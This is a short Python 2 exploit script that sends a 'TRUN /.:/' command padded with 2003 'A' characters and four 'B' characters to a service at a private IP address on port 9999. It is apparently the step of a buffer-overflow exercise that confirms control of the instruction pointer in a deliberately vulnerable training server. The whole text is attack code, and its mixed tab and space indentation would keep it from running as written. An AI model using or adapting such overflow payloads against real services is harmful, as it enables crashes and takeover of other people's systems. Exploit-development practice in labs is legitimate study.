#!/usr/bin/python 
import sys, socket  

shell = "A" * 2003 + "B" * 4

try: 
				s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
                                s.connect(( '192.168.31.146', 9999)) 
				
				s.send(( 'TRUN /.:/' + shell))  
				s.close()  
			     
except : 
				print "error in connection"
				sys.exit()
